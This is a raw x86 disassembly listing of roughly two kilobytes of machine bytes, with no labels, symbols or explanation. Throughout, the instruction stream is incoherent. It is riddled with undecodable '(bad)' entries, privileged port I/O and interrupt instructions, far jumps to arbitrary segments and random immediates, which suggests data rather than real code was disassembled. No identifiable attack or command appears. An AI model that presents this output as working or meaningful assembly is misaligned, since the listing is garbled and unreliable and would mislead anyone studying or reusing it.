  41aa51:	and    esp,eax
  41aa53:	jle    0x41aace
  41aa55:	and    eax,0xba343c39
  41aa5a:	in     al,0x78
  41aa5c:	add    ah,BYTE PTR [eax]
  41aa5e:	or     BYTE PTR [ebp-0x9],al
  41aa61:	lea    esp,[edx]
  41aa63:	fiadd  DWORD PTR [edx-0x41]
  41aa66:	shl    BYTE PTR [edi+0x6e41732c],1
  41aa6c:	loop   0x41aa26
  41aa6e:	fldcw  WORD PTR [ecx+0x60f7e078]
  41aa74:	sbb    eax,0xd9c4c08f
  41aa79:	in     al,dx
  41aa7a:	jl     0x41aada
  41aa7c:	dec    ebx
  41aa7d:	cli    
  41aa7e:	pushf  
  41aa7f:	xor    edx,DWORD PTR [ebx-0x11]
  41aa82:	js     0x41aace
  41aa84:	push   esp
  41aa85:	sub    BYTE PTR [ebx],ch
  41aa87:	gs stos WORD PTR es:[edi],ax
  41aa8a:	sub    eax,0x96f80178
  41aa8f:	out    dx,eax
  41aa90:	outs   dx,BYTE PTR ds:[esi]
  41aa91:	cmc    
  41aa92:	sub    esp,ecx
  41aa94:	and    bh,BYTE PTR [esi+ecx*2+0x62]
  41aa98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa99:	mov    dl,0x30
  41aa9b:	xchg   ebp,eax
  41aa9c:	push   esi
  41aa9d:	lods   eax,DWORD PTR ds:[esi]
  41aa9e:	imul   ecx,edx,0xb3235b01
  41aaa4:	and    eax,0x12a7ac7d
  41aaa9:	or     eax,0x268ec761
  41aaae:	outs   dx,BYTE PTR ds:[esi]
  41aaaf:	test   al,0x9d
  41aab1:	into   
  41aab2:	cmc    
  41aab3:	push   ecx
  41aab4:	xlat   BYTE PTR ds:[ebx]
  41aab5:	pop    ebx
  41aab6:	push   ds
  41aab7:	jmp    0x1948:0x73ced189
  41aabe:	adc    ecx,DWORD PTR [edi]
  41aac0:	sbb    ch,al
  41aac2:	jle    0x41aacc
  41aac4:	nop
  41aac5:	pop    ebp
  41aac6:	sub    ah,ah
  41aac8:	add    DWORD PTR [ecx-0x37],esi
  41aacb:	pop    esp
  41aacc:	push   0x55
  41aace:	xchg   edi,eax
  41aacf:	xor    BYTE PTR [ebp-0x1fb21bc4],ah
  41aad5:	jge    0x41ab3c
  41aad7:	imul   ecx,DWORD PTR [ebx+edi*8-0x38],0xffffffa9
  41aadc:	pop    ss
  41aadd:	pusha  
  41aade:	(bad)  
  41aadf:	or     cl,BYTE PTR [ebp+0x32]
  41aae2:	mov    edi,0x38e90d5c
  41aae7:	iret   
  41aae8:	jae    0x41aa96
  41aaea:	xchg   ebp,eax
  41aaeb:	fiadd  WORD PTR gs:[eax]
  41aaee:	data16 ds (bad) 
  41aaf1:	sub    al,0x8e
  41aaf3:	sbb    al,0xf1
  41aaf5:	sahf   
  41aaf6:	jo     0x41ab02
  41aaf8:	icebp  
  41aaf9:	push   ecx
  41aafa:	ret    0xad31
  41aafd:	mov    esp,0x81bfcdfb
  41ab02:	xlat   BYTE PTR ss:[ebx]
  41ab04:	xchg   ebx,eax
  41ab05:	loop   0x41aad3
  41ab07:	loope  0x41aaa7
  41ab09:	xchg   ebx,eax
  41ab0a:	sbb    bl,BYTE PTR [esp+esi*1+0x3b]
  41ab0e:	imul   ebp,DWORD PTR es:[eax+0xfe17e45],0xffffff9b
  41ab16:	imul   ecx,DWORD PTR ds:0x65481707,0xebd83b85
  41ab20:	mov    ecx,0xcc9615ba
  41ab25:	inc    ecx
  41ab26:	cs fadd st,st(7)
  41ab29:	jl     0x41aab5
  41ab2b:	jo     0x41aad5
  41ab2d:	mov    dl,0x76
  41ab2f:	add    eax,0x7f0a1ed1
  41ab34:	pop    esp
  41ab35:	test   eax,0x9415fb1f
  41ab3a:	enter  0x1699,0x70
  41ab3e:	mov    dl,0xa0
  41ab40:	mov    ah,0xaa
  41ab43:	cmp    eax,0xbf4250b4
  41ab48:	mov    edx,cs
  41ab4a:	call   0xbf827af2
  41ab4f:	lods   al,BYTE PTR ds:[esi]
  41ab50:	das    
  41ab51:	imul   ebx,DWORD PTR [edi+0x20420ff2],0xffffffb6
  41ab58:	mov    ds:0x3df78784,al
  41ab5d:	mov    dh,0xc2
  41ab5f:	loopne 0x41abab
  41ab61:	cdq    
  41ab62:	xor    DWORD PTR [edi-0x4411f392],esi
  41ab68:	fiadd  WORD PTR [edx-0x15]
  41ab6b:	sub    ebx,eax
  41ab6d:	lods   al,BYTE PTR ds:[esi]
  41ab6e:	repz xchg esp,eax
  41ab70:	xchg   ebx,eax
  41ab71:	xor    dh,BYTE PTR [esi+0x24110680]
  41ab77:	loop   0x41aba6
  41ab79:	push   esi
  41ab7a:	imul   edx,DWORD PTR [eax-0x56fa3383],0x14
  41ab81:	dec    esp
  41ab82:	xchg   BYTE PTR [edi],ch
  41ab84:	add    al,0xca
  41ab86:	inc    ecx
  41ab87:	test   BYTE PTR [eax],dl
  41ab89:	fist   DWORD PTR [eax]
  41ab8b:	jne    0x41ab4e
  41ab8d:	adc    DWORD PTR [edx+0x61c8f7cf],0x46663daf
  41ab97:	lahf   
  41ab98:	call   0x8d733a6a
  41ab9d:	sti    
  41ab9e:	mov    ds:0x44a17b7d,eax
  41aba3:	mov    dh,0x52
  41aba5:	mov    al,dh
  41aba7:	push   ebp
  41aba8:	mov    ebx,0xe06bace4
  41abad:	adc    eax,0x688f1bf4
  41abb2:	std    
  41abb3:	xlat   BYTE PTR ds:[ebx]
  41abb4:	scas   al,BYTE PTR es:[edi]
  41abb5:	daa    
  41abb6:	or     ch,BYTE PTR [edi+0x3c156b83]
  41abbc:	adc    BYTE PTR [ebp+esi*2+0xd],0x3e
  41abc1:	sti    
  41abc2:	out    dx,eax
  41abc3:	jmp    0x41abe6
  41abc5:	xchg   ebp,eax
  41abc6:	xor    al,0xd
  41abc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abc9:	ja     0x41abb4
  41abcb:	push   0xffffffed
  41abcd:	pop    esi
  41abce:	xchg   ebp,eax
  41abcf:	aaa    
  41abd0:	mov    ebp,0x50e55e03
  41abd5:	sti    
  41abd6:	mov    al,ds:0xbe43ac14
  41abdb:	dec    esi
  41abdc:	mov    ecx,0x56e53e3a
  41abe1:	adc    esp,DWORD PTR [ebp+0x3e]
  41abe4:	repnz sbb bh,BYTE PTR [esi-0x25]
  41abe8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abe9:	pop    edi
  41abea:	mov    ch,0x20
  41abec:	mov    bl,0xce
  41abee:	ja     0x41abf5
  41abf0:	rcr    ebp,cl
  41abf2:	jl     0x41ab99
  41abf4:	mov    edx,0x9355bb65
  41abf9:	outs   dx,BYTE PTR ds:[esi]
  41abfa:	mov    ebp,0xeb2a72d7
  41abff:	cwde   
  41ac00:	push   ebp
  41ac01:	dec    esi
  41ac02:	mov    ebp,0xb2355b65
  41ac07:	add    DWORD PTR [eax-0x2db8b45],ebp
  41ac0d:	sbb    DWORD PTR [edi],esi
  41ac0f:	bnd ret 
  41ac11:	jge    0x41ac8d
  41ac13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac14:	je     0x41ac75
  41ac16:	sbb    bh,dh
  41ac18:	dec    edx
  41ac19:	les    bp,DWORD PTR [ebp+0x4f20c405]
  41ac20:	(bad)  
  41ac21:	jmp    0x41abd0
  41ac23:	call   0xc46acd5f
  41ac28:	imul   edx,DWORD PTR ds:0x97785966,0x5d
  41ac2f:	(bad)  
  41ac30:	push   ss
  41ac31:	inc    ebx
  41ac32:	enter  0xc71d,0x80
  41ac36:	jmp    0x41abee
  41ac38:	add    BYTE PTR [edx+0x53],dl
  41ac3b:	outs   dx,DWORD PTR ds:[esi]
  41ac3c:	mov    dl,0x2d
  41ac3e:	cmp    edi,DWORD PTR [ecx]
  41ac40:	and    eax,DWORD PTR [eax-0x36]
  41ac43:	sbb    al,0xdc
  41ac45:	aaa    
  41ac46:	xor    al,0x6f
  41ac48:	rcr    BYTE PTR [eax],cl
  41ac4a:	and    edi,DWORD PTR [edx+0x25936068]
  41ac50:	fwait
  41ac51:	addr16 or dh,cl
  41ac54:	cwde   
  41ac55:	test   DWORD PTR [edi+0x8],esp
  41ac58:	stos   BYTE PTR es:[edi],al
  41ac59:	int3   
  41ac5a:	in     al,dx
  41ac5b:	xor    esp,eax
  41ac5d:	or     DWORD PTR [ecx-0x4a],0x1a780393
  41ac64:	xchg   edi,eax
  41ac65:	jns    0x41abfa
  41ac67:	call   0x3063:0x8ef01478
  41ac6e:	inc    ecx
  41ac6f:	std    
  41ac70:	sub    DWORD PTR [esi+edi*4],esi
  41ac73:	mov    ecx,edx
  41ac75:	push   edi
  41ac76:	inc    ebp
  41ac77:	xchg   edi,eax
  41ac78:	add    ebp,0xbaa0be41
  41ac7e:	mov    DWORD PTR [ebx-0x1e615163],0xf39e3836
  41ac88:	and    al,0x82
  41ac8a:	add    BYTE PTR [ebx+0x2c],0xe6
  41ac8e:	cmp    BYTE PTR [eax+0x32],cl
  41ac91:	retf   
  41ac92:	jo     0x41ad03
  41ac94:	pop    ebp
  41ac95:	jno    0x41accd
  41ac97:	jo     0x41ac74
  41ac99:	add    bh,BYTE PTR [ebx]
  41ac9b:	loopne 0x41ad00
  41ac9d:	sbb    eax,0x8a279d7a
  41aca2:	cdq    
  41aca3:	rcl    DWORD PTR [eax+eiz*1],1
  41aca6:	mov    eax,0x534a1c15
  41acab:	scas   al,BYTE PTR es:[edi]
  41acac:	mov    edx,0x6888e22b
  41acb1:	pop    edx
  41acb2:	nop
  41acb3:	cmp    eax,0xc0d75031
  41acb8:	ror    BYTE PTR [ebx+0x37],1
  41acbb:	(bad)  
  41acbc:	mov    cl,0x12
  41acbe:	(bad)  
  41acbf:	loopne 0x41ad32
  41acc1:	add    dl,bl
  41acc3:	push   ss
  41acc4:	xor    eax,0x90cad714
  41acc9:	dec    ebp
  41acca:	adc    eax,0x83b717c0
  41accf:	and    eax,0x7e6d8c15
  41acd4:	rcr    cl,cl
  41acd6:	lock (bad) [edi-0x6824d2e3]
  41acdd:	xchg   ebp,eax
  41acde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acdf:	sbb    al,0xf5
  41ace1:	xchg   edi,eax
  41ace2:	inc    edx
  41ace3:	sbb    al,0xe6
  41ace5:	push   ebp
  41ace6:	jae    0x41ad25
  41ace8:	icebp  
  41ace9:	ja     0x41ad43
  41aceb:	sbb    esi,DWORD PTR ds:[ebx-0x55]
  41acef:	test   BYTE PTR ds:0xa43e928e,bl
  41acf5:	loop   0x41ad49
  41acf7:	ficom  DWORD PTR [ebx+0x232926a3]
  41acfd:	dec    esi
  41acfe:	push   ebp
  41ad00:	xor    eax,0x51d0a583
  41ad05:	xor    ch,BYTE PTR [eax+0x58]
  41ad08:	retf   
  41ad09:	imul   ebx,ebx,0xffffff85
  41ad0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad0d:	and    DWORD PTR [ebx],esi
  41ad0f:	fwait
  41ad10:	sbb    edi,esp
  41ad12:	push   edx
  41ad13:	jo     0x41ad6b
  41ad15:	sti    
  41ad16:	je     0x41acd4
  41ad18:	pop    esi
  41ad19:	mov    ?,WORD PTR [ebx+esi*1]
  41ad1c:	daa    
  41ad1d:	stos   BYTE PTR es:[edi],al
  41ad1e:	adc    bl,dl
  41ad20:	jo     0x41acef
  41ad22:	cmp    ch,BYTE PTR [eax]
  41ad24:	or     BYTE PTR [edi+0x13e92ef6],bh
  41ad2a:	inc    esp
  41ad2b:	push   ebp
  41ad2c:	jmp    0x4269:0xc698124f
  41ad33:	sbb    al,0xdf
  41ad35:	(bad)  
  41ad37:	sbb    ecx,eax
  41ad39:	rol    DWORD PTR [ebp-0x229465d2],1
  41ad3f:	inc    esi
  41ad40:	shl    DWORD PTR [ecx+0x1],1
  41ad43:	mov    esi,0x9e767362
  41ad48:	and    ecx,DWORD PTR [esi]
  41ad4a:	jle    0x41acf8
  41ad4c:	int    0xa5
  41ad4e:	ret    
  41ad4f:	ror    DWORD PTR [eax+edx*8],cl
  41ad52:	jbe    0x41ad41
  41ad54:	sbb    DWORD PTR [ebx],edi
  41ad56:	mov    BYTE PTR ds:0x1691946f,al
  41ad5c:	int    0x89
  41ad5e:	push   ecx
  41ad5f:	(bad)  
  41ad60:	or     BYTE PTR [edx+0x38],cl
  41ad63:	xchg   esp,eax
  41ad64:	xchg   BYTE PTR [ebx],al
  41ad66:	add    DWORD PTR [ecx+0x1f],ebx
  41ad69:	and    al,0x79
  41ad6b:	xchg   edx,eax
  41ad6c:	out    dx,eax
  41ad6d:	lods   al,BYTE PTR ds:[esi]
  41ad6e:	mov    bh,0x3f
  41ad70:	fild   WORD PTR [edx]
  41ad72:	add    DWORD PTR [esi+0x70469f4d],ecx
  41ad78:	lds    eax,FWORD PTR [ecx]
  41ad7a:	mov    dl,0x45
  41ad7c:	push   esi
  41ad7d:	(bad)  
  41ad7e:	sti    
  41ad7f:	inc    edi
  41ad80:	js     0x41adf9
  41ad82:	inc    edi
  41ad83:	or     al,BYTE PTR [eax]
  41ad85:	lods   eax,DWORD PTR ds:[esi]
  41ad86:	sbb    al,0xf4
  41ad88:	loopne 0x41ad5e
  41ad8a:	cmp    dh,BYTE PTR [edi-0x6d]
  41ad8d:	add    bl,BYTE PTR [ecx]
  41ad8f:	sbb    eax,0xd75233e2
  41ad94:	xor    dl,cl
  41ad96:	aaa    
  41ad97:	add    al,0xd7
  41ad99:	je     0x41ad5b
  41ad9b:	ror    BYTE PTR [ebp-0x49],1
  41ad9e:	es cld 
  41ada0:	call   FWORD PTR [eax+0xd01366f]
  41ada6:	and    al,0xac
  41ada8:	ret    
  41ada9:	push   ebx
  41adaa:	jl     0x41ae1b
  41adac:	inc    esp
  41adad:	fild   QWORD PTR [ebx-0x100badb2]
  41adb3:	stos   BYTE PTR es:[edi],al
  41adb4:	out    dx,al
  41adb5:	cmp    DWORD PTR [eax+eiz*4+0x4d],esi
  41adb9:	rol    eax,1
  41adbb:	add    esp,DWORD PTR [ecx-0xba60d6d]
  41adc1:	xchg   ecx,eax
  41adc2:	outs   dx,DWORD PTR ds:[esi]
  41adc3:	adc    eax,0xcc3b52e6
  41adc8:	bnd jno 0x41ad50
  41adcb:	mov    bh,0xb1
  41adcd:	(bad)  
  41adcf:	sub    eax,0x30b27e5b
  41add4:	loope  0x41ad75
  41add6:	xor    cl,BYTE PTR [eax+0x90e20e0]
  41addc:	mov    ds,edi
  41adde:	sbb    eax,0x74a4cca9
  41ade3:	loope  0x41adeb
  41ade5:	imul   esp,DWORD PTR [eax],0x801bb778
  41adeb:	xor    BYTE PTR [ebx-0x52],ch
  41adee:	jns    0x41ad99
  41adf0:	int    0xe3
  41adf2:	fild   DWORD PTR [ecx+edi*4-0x4e]
  41adf6:	cmp    BYTE PTR [eax],al
  41adf8:	lds    eax,FWORD PTR [esi+0x6e45e20d]
  41adfe:	cld    
  41adff:	bswap  esi
  41ae01:	add    BYTE PTR [ebx],dh
  41ae03:	rol    esp,1
  41ae05:	dec    esi
  41ae06:	push   ebp
  41ae07:	sub    DWORD PTR [ecx],ebx
  41ae09:	stos   DWORD PTR es:[edi],eax
  41ae0a:	loop   0x41ae09
  41ae0c:	xor    edi,DWORD PTR [esi]
  41ae0e:	(bad)  
  41ae0f:	sub    esp,DWORD PTR [esi]
  41ae11:	idiv   DWORD PTR [edi-0x48]
  41ae14:	jbe    0x41ad9c
  41ae16:	add    eax,0xe618467
  41ae1b:	push   es
  41ae1c:	fcom   QWORD PTR [ebp+0x74]
  41ae1f:	sbb    DWORD PTR [ebx],esi
  41ae21:	les    ecx,FWORD PTR [ebx]
  41ae23:	test   al,0x6e
  41ae25:	add    DWORD PTR [eax-0x7b],ebx
  41ae28:	cmp    BYTE PTR [eax-0x6cf70b49],bh
  41ae2e:	push   ebp
  41ae2f:	ja     0x41ae39
  41ae31:	mov    ds:0x2931222e,al
  41ae36:	ror    cl,0x99
  41ae39:	out    0x0,al
  41ae3b:	mov    dh,0x30
  41ae3d:	shl    BYTE PTR [ebx-0xa],1
  41ae40:	jnp    0x41adcf
  41ae42:	push   es
  41ae43:	sub    al,0xcb
  41ae45:	jmp    DWORD PTR [ebp+ecx*4+0x6b]
  41ae49:	rol    DWORD PTR [ecx+eiz*8+0x3f76ffb3],cl
  41ae50:	addr16 (bad) 
  41ae52:	out    0x46,al
  41ae54:	iret   
  41ae55:	loope  0x41ae72
  41ae57:	in     al,dx
  41ae58:	dec    esi
  41ae59:	jmp    0x966b:0x410fb827
  41ae60:	shr    BYTE PTR [eax],cl
  41ae62:	mov    esp,esi
  41ae64:	(bad)  
  41ae65:	mov    edi,0xe2f9c66e
  41ae6a:	or     BYTE PTR [eax+edx*1-0x6c],0x23
  41ae6f:	cld    
  41ae70:	xlat   BYTE PTR ds:[ebx]
  41ae71:	std    
  41ae72:	hlt    
  41ae73:	cld    
  41ae74:	sub    al,0xdd
  41ae76:	or     edx,DWORD PTR [esi-0x34d86eeb]
  41ae7c:	aaa    
  41ae7d:	mov    esp,0x2e32800b
  41ae82:	pop    ebx
  41ae83:	xor    eax,0x18be17d5
  41ae88:	out    0x8a,eax
  41ae8a:	cmp    ebx,DWORD PTR [edi]
  41ae8c:	xchg   ebx,eax
  41ae8d:	cmp    al,0xc9
  41ae8f:	rcl    DWORD PTR [edi+ebx*1-0x6322e0db],cl
  41ae96:	imul   ebx,DWORD PTR [ebp+0x1fc46c10],0x2e33a133
  41aea0:	mov    ?,ebx
  41aea2:	mov    fs,WORD PTR [ecx-0x79]
  41aea5:	ror    ch,cl
  41aea7:	push   ebp
  41aea8:	mov    ebx,0x5a4bb291
  41aead:	stos   DWORD PTR es:[edi],eax
  41aeae:	push   es
  41aeaf:	adc    BYTE PTR [eax-0x11],dh
  41aeb2:	ds retf 0x5a36
  41aeb6:	shl    BYTE PTR [ecx+0x657befcd],0x1d
  41aebd:	ds call 0x2405f3b
  41aec3:	ficom  WORD PTR ds:[esi-0x2d]
  41aec7:	jp     0x41af17
  41aec9:	push   cs
  41aeca:	or     DWORD PTR [ebx+edi*8-0x65995404],ebp
  41aed1:	sbb    BYTE PTR [eax-0x2f9f9f71],ah
  41aed7:	and    eax,0x373d3ce2
  41aedc:	mov    bl,0xbd
  41aede:	mov    bl,0x1c
  41aee0:	shr    DWORD PTR [eax-0x25f0ba85],1
  41aee6:	pusha  
  41aee7:	enter  0x25a7,0x2
  41aeeb:	inc    ebp
  41aeec:	(bad)  
  41aeed:	loopne 0x41af1f
  41aeef:	jne    0x41af37
  41aef1:	inc    ax
  41aef3:	or     ah,dh
  41aef5:	hlt    
  41aef6:	aaa    
  41aef7:	adc    DWORD PTR [edi],edi
  41aef9:	aas    
  41aefa:	ret    0x3391
  41aefd:	inc    esi
  41aefe:	adc    esp,edx
  41af00:	(bad)  
  41af01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af02:	adc    ecx,esi
  41af04:	inc    eax
  41af05:	in     al,0xf8
  41af07:	retf   0x78ef
  41af0a:	popf   
  41af0b:	fcom   DWORD PTR [ecx-0x16]
  41af0e:	popa   
  41af0f:	mov    ecx,0x3b76164d
  41af14:	mov    al,BYTE PTR [eax+0x74]
  41af17:	dec    si
  41af19:	pop    ds
  41af1a:	mov    ch,0x78
  41af1c:	dec    ebp
  41af1d:	mov    edx,0xce841304
  41af22:	push   ebx
  41af23:	or     DWORD PTR [ecx-0x1a09b91],edi
  41af29:	mov    al,0x50
  41af2b:	out    dx,eax
  41af2c:	inc    esp
  41af2d:	ja     0x41af69
  41af2f:	xchg   ecx,eax
  41af30:	mov    ch,0xda
  41af32:	(bad)  
  41af33:	(bad)
  41af37:	or     BYTE PTR [ecx],cl
  41af39:	and    al,BYTE PTR [ebx+0x4784dd2b]
  41af3f:	jmp    0x3c9de49e
  41af44:	mov    ch,0xd
  41af46:	push   ebx
  41af47:	add    eax,0xe99ed588
  41af4c:	mov    al,ds:0xbb4104fb
  41af51:	push   0xc03241ac
  41af56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af57:	stc    
  41af58:	adc    eax,0x72368199
  41af5d:	in     eax,0xcf
  41af5f:	stos   DWORD PTR es:[edi],eax
  41af60:	mov    DWORD PTR [eax],edi
  41af62:	push   ebx
  41af63:	mov    dh,0xde
  41af65:	jns    0x96c8f87b
  41af6b:	pop    ebx
  41af6c:	test   DWORD PTR [ebx+0x79],esi
  41af6f:	adc    al,BYTE PTR [edx]
  41af71:	jnp    0x41afe5
  41af73:	rcl    DWORD PTR [edi+0x4918370a],0xc0
  41af7a:	jecxz  0x41afad
  41af7c:	xchg   ebx,eax
  41af7d:	adc    esi,DWORD PTR [ecx+eax*4]
  41af80:	pop    ebx
  41af81:	push   esp
  41af82:	sbb    esp,DWORD PTR [ecx-0x619bc17e]
  41af88:	cwde   
  41af89:	xchg   BYTE PTR [eax-0x7],bh
  41af8c:	xlat   BYTE PTR ds:[ebx]
  41af8d:	push   edx
  41af8e:	and    ecx,DWORD PTR [edx-0x6a]
  41af91:	pop    ss
  41af92:	int    0x5a
  41af94:	aad    0xa5
  41af96:	mov    ah,0x18
  41af98:	add    al,0xa8
  41af9a:	add    esp,DWORD PTR [ebx]
  41af9c:	jg     0x41af7b
  41af9e:	mov    ecx,0xcc1a735f
  41afa3:	out    0xed,al
  41afa5:	mov    edi,0xe320d6c2
  41afaa:	push   esp
  41afab:	daa    
  41afac:	fimul  DWORD PTR [esi+0x14]
  41afaf:	pop    ds
  41afb0:	shl    BYTE PTR [edx+edi*2],1
  41afb3:	mov    cl,0xbf
  41afb5:	stos   DWORD PTR es:[edi],eax
  41afb6:	sub    eax,0xbaa61b1b
  41afbb:	and    ch,BYTE PTR [eax+edx*2-0x49]
  41afbf:	xchg   dl,bh
  41afc1:	jge    0x41af44
  41afc3:	sbb    BYTE PTR [edx-0x35928b2c],bl
  41afc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afca:	mov    esi,0xf08cc91f
  41afcf:	aaa    
  41afd0:	dec    edi
  41afd1:	ss xor ecx,esp
  41afd4:	xor    eax,0x79d1492d
  41afd9:	push   esi
  41afda:	mov    ch,0xbb
  41afdc:	xchg   esi,eax
  41afdd:	aas    
  41afde:	retf   0xd561
  41afe1:	jg     0x41afc9
  41afe3:	daa    
  41afe4:	jbe    0x41b044
  41afe6:	call   0xae9633ad
  41afeb:	popa   
  41afec:	or     esi,DWORD PTR [ebx+0x330bccbe]
  41aff2:	shr    esp,cl
  41aff4:	test   eax,0xf7835ace
  41aff9:	sub    edx,DWORD PTR [ebp-0x4911baf1]
  41afff:	inc    ecx
  41b000:	scas   eax,DWORD PTR es:[edi]
  41b001:	aas    
  41b002:	mov    WORD PTR [ebp-0x5eeb59d1],fs
  41b008:	inc    edi
  41b009:	(bad)  
  41b00a:	jae    0x41afbe
  41b00c:	fidivr DWORD PTR [edi-0x63]
  41b00f:	cli    
  41b010:	inc    edi
  41b011:	cli    
  41b012:	adc    eax,0xf6a9133f
  41b017:	popf   
  41b018:	pop    esp
  41b019:	daa    
  41b01a:	pop    ebp
  41b01b:	imul   esi
  41b01d:	ins    DWORD PTR es:[edi],dx
  41b01e:	nop
  41b01f:	lock or DWORD PTR [ebx],eax
  41b022:	mov    edx,0xbb4378b0
  41b027:	das    
  41b028:	cli    
  41b029:	or     dl,bh
  41b02b:	pusha  
  41b02c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b02d:	and    DWORD PTR [ebx+esi*1+0x565ee21a],edx
  41b034:	adc    DWORD PTR [eax],esp
  41b036:	pop    ebx
  41b037:	mov    bh,0x73
  41b039:	(bad)  
  41b03a:	adc    ecx,DWORD PTR [edi]
  41b03c:	xchg   edi,eax
  41b03d:	mov    al,ds:0x954dbe5a
  41b042:	mov    cs,WORD PTR [eax]
  41b044:	inc    ecx
  41b045:	int    0x48
  41b047:	lods   eax,DWORD PTR ds:[esi]
  41b048:	cs fcomp st(7)
  41b04b:	sub    eax,0xced7e6df
  41b050:	xchg   BYTE PTR [esi],bl
  41b052:	sub    eax,0x18f97c23
  41b057:	pop    ebx
  41b058:	and    DWORD PTR [ebx-0x53],esi
  41b05b:	mov    WORD PTR [edx],ss
  41b05d:	ret    
  41b05e:	inc    esi
  41b05f:	popa   
  41b060:	and    ebp,DWORD PTR [ebx*4+0x7ba8aed4]
  41b067:	std    
  41b068:	leave  
  41b069:	xor    eax,0x42110e25
  41b06e:	dec    edi
  41b06f:	jmp    0x22421f49
  41b074:	push   0xbac74062
  41b079:	push   esi
  41b07a:	mov    edx,0xde688b3a
  41b07f:	(bad)  
  41b080:	test   al,0xde
  41b082:	inc    esp
  41b083:	xchg   ecx,eax
  41b084:	cvtpi2ps xmm6,QWORD PTR [ebx+edx*8]
  41b088:	xchg   dl,ah
  41b08a:	test   al,0x3a
  41b08c:	xchg   BYTE PTR [edi],bl
  41b08e:	cmp    edi,DWORD PTR [edi]
  41b090:	push   cs
  41b091:	ret    
  41b092:	pop    ds
  41b093:	adc    esp,ebx
  41b095:	stos   DWORD PTR es:[edi],eax
  41b096:	add    ah,ch
  41b098:	paddw  mm2,QWORD PTR [esi]
  41b09b:	out    dx,eax
  41b09c:	jno    0x41b0fa
  41b09e:	fidivr DWORD PTR [ebp+edx*4+0x46b81b7a]
  41b0a5:	pop    esi
  41b0a6:	(bad)  
  41b0a7:	sub    BYTE PTR [eax+0x2730c68],dl
  41b0ad:	dec    edx
  41b0ae:	outs   dx,BYTE PTR ds:[esi]
  41b0af:	inc    edi
  41b0b0:	lods   eax,DWORD PTR ds:[esi]
  41b0b1:	pop    esi
  41b0b2:	dec    edi
  41b0b3:	xor    al,0xe8
  41b0b5:	mov    BYTE PTR [eax+0x4b97a289],bl
  41b0bb:	int3   
  41b0bc:	mov    ah,0xfc
  41b0be:	cmp    cl,BYTE PTR [ecx]
  41b0c0:	(bad)  
  41b0c1:	ins    BYTE PTR es:[edi],dx
  41b0c2:	jmp    0x273f6da7
  41b0c7:	jmp    0x6074:0xc655a031
  41b0ce:	adc    BYTE PTR gs:[edx+0x69],0x48
  41b0d3:	mov    eax,0x62f69adc
  41b0d8:	shl    dh,cl
  41b0da:	inc    edi
  41b0db:	pop    es
  41b0dc:	dec    esi
  41b0dd:	xchg   esp,eax
  41b0de:	jmp    0x8e6f951b
  41b0e3:	xor    eax,0xa7d3facd
  41b0e8:	out    dx,al
  41b0e9:	mov    ecx,0x4d74658e
  41b0ee:	leave  
  41b0ef:	add    WORD PTR [ebx-0x4135efcd],si
  41b0f6:	in     al,dx
  41b0f7:	mov    bh,0xc2
  41b0f9:	leave  
  41b0fa:	jb     0x41b0b6
  41b0fc:	pushf  
  41b0fd:	mov    dl,0xf8
  41b0ff:	int    0xa7
  41b101:	jno    0x41b151
  41b103:	loope  0x41b08c
  41b105:	jmp    0x30e3:0x14dd0f2d
  41b10c:	ret    0x8af
  41b10f:	lods   eax,DWORD PTR ds:[esi]
  41b110:	mov    dh,0x62
  41b112:	xchg   esp,eax
  41b113:	bnd call 0x44cbfa85
  41b119:	mov    eax,0x845114d7
  41b11e:	repz cmc 
  41b120:	and    al,0xff
  41b122:	in     eax,0x79
  41b124:	cmp    bl,BYTE PTR [edi]
  41b126:	fiadd  DWORD PTR [esp+esi*8-0x43]
  41b12a:	push   es
  41b12b:	mov    ch,0x94
  41b12d:	loop   0x41b157
  41b12f:	jno    0x41b177
  41b131:	lods   al,BYTE PTR ds:[esi]
  41b132:	or     eax,0x20d22f3d
  41b137:	xchg   esi,eax
  41b138:	cmp    dl,BYTE PTR [eax+0x51]
  41b13b:	lea    esp,[esi]
  41b13d:	push   ebp
  41b13e:	cmp    edi,ecx
  41b140:	pushf  
  41b141:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b143:	mov    al,ds:0xe65faebe
  41b148:	sub    esi,DWORD PTR [esi-0xf]
  41b14b:	outs   dx,DWORD PTR ds:[si]
  41b14d:	shl    DWORD PTR [ebp+0x3f],0x22
  41b151:	int    0x56
  41b153:	xchg   BYTE PTR [edi+0x5ff2f463],ch
  41b159:	xchg   BYTE PTR [edx+ebx*2-0x52b300b8],bl
  41b160:	into   
  41b161:	std    
  41b162:	push   ebx
  41b163:	mov    BYTE PTR [edx-0x4229cc7d],dh
  41b169:	push   ss
  41b16a:	aas    
  41b16b:	out    0x3b,al
  41b16d:	ret    
  41b16e:	mov    ecx,0x650800bc
  41b173:	and    DWORD PTR [edx],edx
  41b175:	dec    ebp
  41b177:	in     eax,dx
  41b178:	ins    BYTE PTR es:[edi],dx
  41b179:	mov    ds:0x66b67a60,eax
  41b17e:	add    eax,DWORD PTR [ebp-0x1f3294ee]
  41b184:	lea    ebx,[ebx]
  41b186:	pop    eax
  41b187:	sub    DWORD PTR [ecx-0x7ff04df3],eax
  41b18d:	ret    
  41b18e:	push   eax
  41b18f:	dec    eax
  41b190:	push   es
  41b191:	jmp    0x3e2c3fd2
  41b196:	dec    esi
  41b197:	dec    edx
  41b198:	jae    0x41b179
  41b19a:	dec    esi
  41b19b:	inc    esp
  41b19c:	mov    ah,0xb9
  41b19e:	lods   eax,DWORD PTR ds:[esi]
  41b19f:	push   ecx
  41b1a0:	int3   
  41b1a1:	mov    ch,0xca
  41b1a3:	adc    DWORD PTR ds:0x95d38956,ecx
  41b1a9:	add    ebp,DWORD PTR [ecx]
  41b1ab:	pop    ebx
  41b1ac:	scas   eax,DWORD PTR es:[edi]
  41b1ad:	mov    cl,0x24
  41b1af:	lods   al,BYTE PTR ds:[esi]
  41b1b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1b1:	cdq    
  41b1b2:	dec    esp
